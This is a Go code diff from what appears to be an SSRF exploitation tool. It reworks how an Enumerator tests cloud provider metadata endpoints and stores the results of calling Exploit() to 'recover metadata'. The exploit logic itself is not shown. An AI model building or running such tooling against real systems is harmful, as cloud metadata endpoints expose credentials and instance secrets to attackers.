@@ -16,7 +16,7 @@ var (
 type Enumerator struct {
 	Hostname *string `json:"hostname"`
 	EnvType  *string `json:"env"`
-	Results  map[string]string
+	Results  map[string]*SsrfResults
 }
 
 // Creates a new Enumerator, populates with inital recon,
@@ -45,26 +45,34 @@ func StartEnum() *Enumerator {
 	return &Enumerator{
 		Hostname: hostname,
 		EnvType:  envtype,
+		Results: map[string]*SsrfResults{
+			"cloud": nil,
+			"net":   nil,
+			"env":   nil,
+		},
 	}
 }
 
 // Test for SSRF against either a single specified cloud provider,
 // or enumerate all for juicy information.
 func (e *Enumerator) CheckCloud(specific *string) error {
-
 	metadata := GetMetadataEndpoints()
 
+	// if specified, test only for the specific cloud provider
 	if specific != nil && *specific != "" {
 		provider := *specific
 		action, ok := metadata[provider]
 		if !ok {
 			return errors.New("specified cloud provider not found")
 		}
-
-		// test for specific provider and error handle
 		if !action.CheckLitmus() {
 			return errors.New("specified cloud provider does not have metadata endpoint exposed")
 		}
+
+		// if we're good, exploit and recover metadata
+		results := action.Exploit()
+		e.Results["cloud"] = &results
+		return nil
 	}
 
 	// test for each available metadata endpoint
@@ -78,10 +86,9 @@ func (e *Enumerator) CheckCloud(specific *string) error {
 		}
 
 		// if we're good, exploit and recover metadata
-		if err := action.Exploit(); err != nil {
-			fmt.Printf("Cannot exploit for cloud provider %s. Reason: %s\n", provider, err)
-			continue
-		}
+		results := action.Exploit()
+		e.Results["cloud"] = &results
+		break
 	}
 	return nil
 }
